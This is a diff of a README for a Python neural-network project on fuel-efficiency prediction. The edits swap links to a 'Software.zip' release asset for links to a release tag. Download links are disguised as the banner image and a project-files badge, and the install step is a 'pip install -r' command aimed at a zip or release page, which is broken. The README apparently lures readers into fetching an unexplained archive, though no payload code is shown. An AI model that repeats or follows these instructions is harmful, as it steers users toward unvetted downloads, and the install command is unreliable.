@@ -1,6 +1,6 @@
 # 🚗 Fuel Efficiency Prediction with Python 🧠📈
 
-![Fuel Efficiency Prediction](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/download/v1.0/Software.zip)
+![Fuel Efficiency Prediction](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/tag/v2.0)
 
 Welcome to the "Fuel-Efficiency-Prediction--Python" repository! This project is a great way to get hands-on experience with regression techniques by predicting fuel efficiency using the Auto MPG dataset. Through this project, you will build a Neural Network with RMSprop, MSE loss, data normalization, and early stopping to prevent overfitting. The key aspects of this project are to normalize the data, use MAE/MSE for evaluation, and optimize the model to achieve accurate predictions.
 
@@ -22,7 +22,7 @@ To get started with the project, make sure you have Python 3 installed on your s
 To install the necessary libraries and dependencies for this project, run the following command in your terminal:
 
 ```bash
-pip install -r https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/download/v1.0/Software.zip
+pip install -r https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/tag/v2.0
 ```
 
 ## 💻 Usage
@@ -41,7 +41,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download project files](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/download/v1.0/Software.zip)](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/download/v1.0/Software.zip)
+[![Download project files](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/tag/v2.0)](https://github.com/zxurie/Fuel-Efficiency-Prediction--Python/releases/tag/v2.0)
 
 ---
 
